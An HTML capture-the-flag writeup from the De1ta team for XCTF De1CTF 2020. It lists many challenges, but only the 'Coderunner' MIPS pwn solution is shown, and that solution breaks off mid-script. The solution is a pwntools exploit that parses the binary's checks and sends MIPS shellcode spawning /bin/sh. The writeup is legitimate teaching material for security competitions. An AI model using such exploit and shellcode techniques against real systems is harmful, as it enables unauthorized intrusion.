<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head><meta name="generator" content="Hexo 3.9.0">

    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="De1ta-Team">
    

    <!--Author-->
    
        <meta name="author" content="chybeta、pr0ph3t">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="XCTF De1CTF 2020 Writeup">
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="De1ta">

    <!--Type page-->
    
        <meta property="og:type" content="article">
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary">
    

    <!-- Title -->
    
    <title>XCTF De1CTF 2020 Writeup - De1ta</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics --><!-- hexo-inject:begin --><!-- hexo-inject:end -->
    


</head>


<body>

<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><img src="https://avatars0.githubusercontent.com/u/39492862"></a>
        
        <!-- hacked by chybeta -->
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2020/05/06/de1ctf2020 Writeup/">
                XCTF De1CTF 2020 Writeup
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2020-05-06</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h1><span id="de1ta-team"><strong>De1ta-Team</strong></span></h1>
<a id="more"></a>
<blockquote>
<p>Team: De1ta</p>
</blockquote>
<p>前排广告位：De1ta长期招 逆向/pwn/密码学/硬件/取证/杂项/etc. 选手，急招二进制和密码选手,有意向的大佬请联系<code>ZGUxdGFAcHJvdG9ubWFpbC5jb20=</code></p>
<h1><span id="source-exp-wp">source + exp + wp</span></h1>
<p><a href="https://github.com/De1ta-team/De1CTF2020" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2020</a></p>
<p><a href="https://github.com/De1ta-team/De1CTF2020/wp_en.pdf" target="_blank" rel="noopener">Eng Version</a></p>
<!-- toc -->
<ul>
<li><a href="#pwn">pwn</a>
<ul>
<li><a href="#coderunner">Coderunner</a>
<ul>
<li><a href="#setup">setup</a></li>
<li><a href="#solution">Solution</a>
<ul>
<li><a href="#manual-analysis">Manual analysis</a></li>
<li><a href="#angr">Angr</a></li>
</ul></li>
</ul></li>
<li><a href="#broadcasttest">BroadCastTest</a></li>
<li><a href="#pppd">pppd</a></li>
<li><a href="#stl_container">stl_container</a></li>
<li><a href="#mc_realworld">mc_realworld</a></li>
</ul></li>
<li><a href="#crypto">crypto</a>
<ul>
<li><a href="#nlfsr">NLFSR</a></li>
<li><a href="#easyrsa">easyRSA</a></li>
<li><a href="#ecdh">ECDH</a></li>
<li><a href="#homomorphic">Homomorphic</a></li>
<li><a href="#mini-purε-plus">Mini Purε Plus</a></li>
<li><a href="#ov">OV</a></li>
<li><a href="#mc_noisemap">mc_noisemap</a></li>
</ul></li>
<li><a href="#web">web</a>
<ul>
<li><a href="#check-in">check in</a></li>
<li><a href="#animal-crossing">Animal crossing</a>
<ul>
<li><a href="#第一关绕过云waf">第一关：绕过云WAF</a>
<ul>
<li><a href="#第一层黑名单检测">第一层：黑名单检测</a></li>
<li><a href="#第二层静态语法分析">第二层：静态语法分析</a></li>
</ul></li>
<li><a href="#第二关读取400张图片">第二关：读取400张图片</a>
<ul>
<li><a href="#绕过csp引入截图库">绕过CSP引入截图库</a></li>
<li><a href="#读取图片并执行">读取图片并执行</a></li>
</ul></li>
</ul></li>
<li><a href="#calc">calc</a>
<ul>
<li><a href="#1-challenge-info">1. challenge info</a></li>
<li><a href="#2-design-document">2. design document</a></li>
<li><a href="#3-exp">3. exp</a></li>
<li><a href="#4-other-writeups">4. other writeups</a></li>
</ul></li>
<li><a href="#mixture">mixture</a></li>
<li><a href="#easy-php-uaf">Easy PHP UAF</a>
<ul>
<li><a href="#解题思路">解题思路</a></li>
<li><a href="#exp">exp</a></li>
</ul></li>
<li><a href="#mc_logclient">mc_logclient</a></li>
</ul></li>
<li><a href="#misc">misc</a>
<ul>
<li><a href="#mc_easybgm">mc_easybgm</a></li>
<li><a href="#misc-mc_joinin">misc - mc_joinin</a></li>
<li><a href="#mc_champion">mc_champion</a></li>
<li><a href="#life">Life</a>
<ul>
<li><a href="#hints">Hints</a></li>
<li><a href="#flag">Flag</a></li>
<li><a href="#solution-1">Solution</a></li>
<li><a href="#note">Note</a></li>
</ul></li>
<li><a href="#easy-protocol">Easy Protocol</a>
<ul>
<li><a href="#hint">hint</a></li>
<li><a href="#part1">part1</a></li>
<li><a href="#part2">part2</a></li>
<li><a href="#part3">part3</a></li>
<li><a href="#end">END</a></li>
</ul></li>
<li><a href="#hard_pentest">Hard_Pentest</a>
<ul>
<li><a href="#end">End</a></li>
</ul></li>
<li><a href="#misc_chowder">Misc_Chowder</a></li>
</ul></li>
<li><a href="#reverse">reverse</a>
<ul>
<li><a href="#parser">parser</a>
<ul>
<li><a href="#出题思路">出题思路</a></li>
<li><a href="#逆向">逆向</a></li>
<li><a href="#解法">解法</a></li>
</ul></li>
<li><a href="#flw">FLW</a>
<ul>
<li><a href="#queuevirtualmachine">QueueVirtualMachine</a></li>
<li><a href="#virtualmachine">VirtualMachine</a></li>
<li><a href="#算法设计">算法设计</a></li>
<li><a href="#exppy">exp.py</a></li>
</ul></li>
<li><a href="#little-elves">little elves</a></li>
<li><a href="#mc_ticktock">mc_ticktock</a></li>
</ul></li>
</ul>
<!-- tocstop -->
<h1><span id="pwn">pwn</span></h1>
<h2><span id="coderunner">Coderunner</span></h2>
<p>It is a chllenge about AEG &amp; mips-asm.</p>
<h3><span id="setup">setup</span></h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ./docker</span><br><span class="line">docker build -t pwn .</span><br><span class="line">docker run -d -p &quot;0.0.0.0:9999:9999&quot; --name=&quot;pwn&quot; pwn</span><br></pre></td></tr></table></figure>
<h3><span id="solution">Solution</span></h3>
<p>There are several types of check functions（6types * 16 rounds). I wish you guys would know mips-instruction more by reading mips-asm / analysising / imatating. But this challenge is harder than I expected. The check part wastes too much time and the timelimit is too strict. By the way, The file Time is able to write, and the context(which you can forge) will be updated to Rank. There are two types of exp for this challenge.</p>
<h4><span id="manual-analysis">Manual analysis</span></h4>
<p>fast but annoying</p>
<ol type="1">
<li>Get some binary</li>
<li>specific solution of each type of check function
<ol type="1">
<li>Get the Bytecode</li>
<li>Feature recognition</li>
<li>Parameter extraction</li>
</ol></li>
<li>shellcode</li>
</ol>
<p>This rough exp sometimes may work &lt;3. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'mips'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analys</span><span class="params">(name=<span class="string">'./1'</span>)</span>:</span></span><br><span class="line">    b=ELF(name)</span><br><span class="line">    entry=b.sym[<span class="string">'main'</span>]+(<span class="number">0xa8</span><span class="number">-0x1c</span>)</span><br><span class="line">    entry=entry<span class="number">-0x400000</span></span><br><span class="line">    tmp=open(<span class="string">"./1"</span>,<span class="string">"r"</span>)</span><br><span class="line">    check=u32(tmp.read()[entry:entry+<span class="number">3</span>]+<span class="string">'\0'</span>)&lt;&lt;<span class="number">2</span></span><br><span class="line">    check=check+(<span class="number">0xbc</span><span class="number">-0x28</span>)<span class="number">-0x400000</span></span><br><span class="line">    tmp.close()</span><br><span class="line">    tmp=open(<span class="string">"./1"</span>,<span class="string">'r'</span>)</span><br><span class="line">    END=(u32(tmp.read()[check:check+<span class="number">3</span>]+<span class="string">'\0'</span>)&lt;&lt;<span class="number">2</span>)<span class="number">-4</span></span><br><span class="line">    tmp.close()</span><br><span class="line">    <span class="comment"># now we get the END of check funcs</span></span><br><span class="line">    START=<span class="number">0x400bb0</span></span><br><span class="line">    f=open(name)</span><br><span class="line">    f.read(<span class="number">0xbb0</span>)</span><br><span class="line">    data=f.read(END-START)[<span class="number">44</span>:]</span><br><span class="line">    f.close()</span><br><span class="line">    tmp=data.split(<span class="string">"\x08\x00\xe0\x03\x00\x00\x00\x00"</span>)</span><br><span class="line">    <span class="keyword">assert</span>(len(tmp)==<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(s==<span class="string">'\x10'</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span><span class="comment">#&lt;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span><span class="comment">#&gt;=</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_1</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># asb(s[0]*s[0]-s[3]*s[3])?asb(s[1]*s[1]-s[2]*s[2])</span></span><br><span class="line">    <span class="comment"># asb(s[1]*s[1]-s[0]*s[0])?asb(s[2]*s[2]-s[3]*s[3])</span></span><br><span class="line">    s=s[<span class="number">24</span>:]</span><br><span class="line">    tmp=ord(s[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    idx_list=[tmp,(tmp+<span class="number">1</span>)%<span class="number">4</span>,(tmp+<span class="number">2</span>)%<span class="number">4</span>,(tmp+<span class="number">3</span>)%<span class="number">4</span>]</span><br><span class="line">    m1=judge(s[<span class="number">0xa8</span>+<span class="number">7</span>])</span><br><span class="line">    m2=judge(s[<span class="number">0x160</span>+<span class="number">7</span>])</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    tmp=[]</span></span><br><span class="line"><span class="string">    for x in range(4):</span></span><br><span class="line"><span class="string">        tmp.append(Int('x&#123;&#125;'.format(x)))</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">    solver = Solver()</span></span><br><span class="line"><span class="string">    for x in range(4):</span></span><br><span class="line"><span class="string">        solver.add(tmp[x]&gt;=0,tmp[x]&lt;256)</span></span><br><span class="line"><span class="string">    if(m1):</span></span><br><span class="line"><span class="string">        solver.add((tmp[0]*tmp[0]-tmp[3]*tmp[3])*(tmp[0]*tmp[0]-tmp[3]*tmp[3])&lt;(tmp[1]*tmp[1]-tmp[2]*tmp[2])*(tmp[1]*tmp[1]-tmp[2]*tmp[2]))</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        solver.add((tmp[0]*tmp[0]-tmp[3]*tmp[3])*(tmp[0]*tmp[0]-tmp[3]*tmp[3])&gt;=(tmp[1]*tmp[1]-tmp[2]*tmp[2])*(tmp[1]*tmp[1]-tmp[2]*tmp[2]))</span></span><br><span class="line"><span class="string">    if(m2):</span></span><br><span class="line"><span class="string">        solver.add((tmp[1]*tmp[1]-tmp[0]*tmp[0])*(tmp[1]*tmp[1]-tmp[0]*tmp[0])&lt;(tmp[2]*tmp[2]-tmp[3]*tmp[3])*(tmp[2]*tmp[2]-tmp[3]*tmp[3]))</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        solver.add((tmp[1]*tmp[1]-tmp[0]*tmp[0])*(tmp[1]*tmp[1]-tmp[0]*tmp[0])&gt;=(tmp[2]*tmp[2]-tmp[3]*tmp[3])*(tmp[2]*tmp[2]-tmp[3]*tmp[3]))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if solver.check() == sat:</span></span><br><span class="line"><span class="string">        res=solver.model()</span></span><br><span class="line"><span class="string">        print res</span></span><br><span class="line"><span class="string">        print m1,m2</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> m1==<span class="number">1</span> <span class="keyword">and</span> m2==<span class="number">1</span>:</span><br><span class="line">        res_list=[<span class="number">79</span>,<span class="number">192</span>,<span class="number">215</span>,<span class="number">18</span>]</span><br><span class="line">    <span class="keyword">elif</span> m1==<span class="number">1</span> <span class="keyword">and</span> m2==<span class="number">0</span>:</span><br><span class="line">        res_list=[<span class="number">93</span>,<span class="number">246</span>,<span class="number">240</span>,<span class="number">81</span>]</span><br><span class="line">    <span class="keyword">elif</span> m1==<span class="number">0</span> <span class="keyword">and</span> m2==<span class="number">1</span>:</span><br><span class="line">        res_list=[<span class="number">0</span>,<span class="number">88</span>,<span class="number">38</span>,<span class="number">80</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res_list=[<span class="number">227</span>,<span class="number">70</span>,<span class="number">35</span>,<span class="number">163</span>]</span><br><span class="line">    tmp=zip(idx_list,res_list)</span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    tmp.sort()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> tmp:</span><br><span class="line">        res+=chr(_[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_2</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># s[0]+s[1] != ?</span></span><br><span class="line">    <span class="comment"># s[1]+s[2] != ?</span></span><br><span class="line">    <span class="comment"># s[2]+s[3] != ?</span></span><br><span class="line">    <span class="comment"># s[3]+s[0] != ?</span></span><br><span class="line">    <span class="keyword">return</span> p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_3</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># s[0]+s[1]+s[2]== ?</span></span><br><span class="line">    <span class="comment"># s[1]+s[2]+s[3]== ?</span></span><br><span class="line">    <span class="comment"># s[2]+s[3]+s[0]== ?</span></span><br><span class="line">    <span class="comment"># s[3]+s[0]+s[1]== ?</span></span><br><span class="line">    s=s[<span class="number">24</span>:<span class="number">24</span>+<span class="number">0xdc</span>]</span><br><span class="line">    s=s.split(<span class="string">"\0"</span>+<span class="string">'\x62\x14'</span>)</span><br><span class="line">    s.pop()</span><br><span class="line">    idx_list=[((x+ord(s[<span class="number">0</span>][<span class="number">0</span>]))<span class="number">-1</span>)%<span class="number">4</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">    res_list=[]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        res_list.append(u16(s[_][<span class="number">-5</span>:<span class="number">-3</span>]))</span><br><span class="line">    sig=sum(res_list)/<span class="number">3</span></span><br><span class="line">    tmp_list=[]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        tmp_list.append(sig-res_list[_])</span><br><span class="line">    tmp=zip(idx_list,tmp_list)</span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    tmp.sort()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        res+=chr(tmp[_][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_4</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># s[0] == ?</span></span><br><span class="line">    <span class="comment"># s[1] == ?</span></span><br><span class="line">    <span class="comment"># s[2] == s[0] * s[0]</span></span><br><span class="line">    <span class="comment"># s[3] == s[1]*s[1]+s[2]*s[2]-s[0]*s[0]</span></span><br><span class="line">    s=s[<span class="number">24</span>:]</span><br><span class="line">    <span class="keyword">if</span>(ord(s[<span class="number">0</span>])==<span class="number">0</span>):</span><br><span class="line">        idx_list=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        idx_list=[]</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            idx_list.append((ord(s[<span class="number">0</span>])+_)%<span class="number">4</span>)</span><br><span class="line">    res_list=[]</span><br><span class="line">    tmp=s.find(<span class="string">'\x00\x02\x24'</span>)</span><br><span class="line">    res_list.append(ord(s[tmp<span class="number">-1</span>]))</span><br><span class="line">    res_list.append(ord(s[s.find(<span class="string">'\x00\x02\x24'</span>,tmp+<span class="number">1</span>)<span class="number">-1</span>]))</span><br><span class="line">    res_list.append((res_list[<span class="number">0</span>]*res_list[<span class="number">0</span>])%<span class="number">256</span>)</span><br><span class="line">    res_list.append(((res_list[<span class="number">1</span>]*res_list[<span class="number">1</span>])+(res_list[<span class="number">2</span>]*res_list[<span class="number">2</span>])-(res_list[<span class="number">0</span>]*res_list[<span class="number">0</span>]))%<span class="number">256</span>)</span><br><span class="line">    tmp=zip(idx_list,res_list)</span><br><span class="line">    tmp.sort()</span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> tmp:</span><br><span class="line">        res+=chr(_[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_5</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># s[0]^s[1] == ?</span></span><br><span class="line">    <span class="comment"># s[1] == ?</span></span><br><span class="line">    <span class="comment"># s[2] == ((s[0]^s[1]&amp;0x7f)*2)%256</span></span><br><span class="line">    <span class="comment"># s[3] == s[0]^s[1]^s[2]</span></span><br><span class="line">    s=s[<span class="number">24</span>:<span class="number">24</span>+<span class="number">172</span>]</span><br><span class="line">    s=s.split(<span class="string">'\x00\x62\x14'</span>)</span><br><span class="line">    res_list=[]</span><br><span class="line">    tmp=ord(s[<span class="number">1</span>][<span class="number">-5</span>])</span><br><span class="line">    res_list.append(ord(s[<span class="number">0</span>][<span class="number">-5</span>])^tmp)</span><br><span class="line">    res_list.append(tmp)</span><br><span class="line">    res_list.append((((res_list[<span class="number">0</span>]^res_list[<span class="number">1</span>])&amp;<span class="number">0x7f</span>)*<span class="number">2</span>)%<span class="number">256</span>)</span><br><span class="line">    res_list.append(res_list[<span class="number">0</span>]^res_list[<span class="number">1</span>]^res_list[<span class="number">2</span>])</span><br><span class="line">    idx_list=[(x+ord(s[<span class="number">0</span>][<span class="number">0</span>]))%<span class="number">4</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">    tmp=zip(idx_list,res_list)</span><br><span class="line">    tmp.sort()</span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> tmp:</span><br><span class="line">        res+=chr(x[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_6</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># s[0]=s[2]</span></span><br><span class="line">    <span class="comment"># s[3]=s[1]</span></span><br><span class="line">    <span class="comment"># s[3]= ?</span></span><br><span class="line">    <span class="comment"># s[2]= ?</span></span><br><span class="line">    s=s[<span class="number">24</span>:<span class="number">24</span>+<span class="number">0x64</span>]</span><br><span class="line">    s=s.split(<span class="string">'\x00\x62\x14'</span>)</span><br><span class="line">    s.pop()</span><br><span class="line">    tmp=ord(s[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    idx_list=[tmp,(tmp+<span class="number">2</span>)%<span class="number">4</span>,(tmp+<span class="number">3</span>)%<span class="number">4</span>,(tmp+<span class="number">1</span>)%<span class="number">4</span>]</span><br><span class="line">    res_list=[]</span><br><span class="line">    res_list.append(ord(s[<span class="number">3</span>][<span class="number">-5</span>]))</span><br><span class="line">    res_list.append(ord(s[<span class="number">3</span>][<span class="number">-5</span>]))</span><br><span class="line">    res_list.append(ord(s[<span class="number">2</span>][<span class="number">-5</span>]))</span><br><span class="line">    res_list.append(ord(s[<span class="number">2</span>][<span class="number">-5</span>]))</span><br><span class="line">    tmp=zip(idx_list,res_list)</span><br><span class="line">    tmp.sort()</span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> tmp:</span><br><span class="line">        res+=chr(_[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">######################</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(data)</span>:</span></span><br><span class="line">    p.readuntil(<span class="string">"Faster &gt; \n"</span>)</span><br><span class="line">    p.send(data.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    p.readuntil(<span class="string">"Name\n&gt; "</span>)</span><br><span class="line">    p.send(<span class="string">"niernier"</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    p.readuntil(<span class="string">"&gt; \n"</span>)</span><br><span class="line">    sh=<span class="string">'''</span></span><br><span class="line"><span class="string">    li $a0,0x6e69622f</span></span><br><span class="line"><span class="string">    sw $a0,0($sp)</span></span><br><span class="line"><span class="string">    li $a0,0x68732f</span></span><br><span class="line"><span class="string">    sw $a0,4($sp)</span></span><br><span class="line"><span class="string">    move $a0,$sp</span></span><br><span class="line"><span class="string">    li $v0,4011</span></span><br><span class="line"><span class="string">    li $a1,0</span></span><br><span class="line"><span class="string">    li $a2,0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(len(asm(sh)))</span><br><span class="line">    p.send(asm(sh))</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_pow</span><span class="params">()</span>:</span></span><br><span class="line">    p.readuntil(<span class="string">'hashlib.sha256(s).hexdigest() == "'</span>)</span><br><span class="line">    res=p.read(<span class="number">64</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span 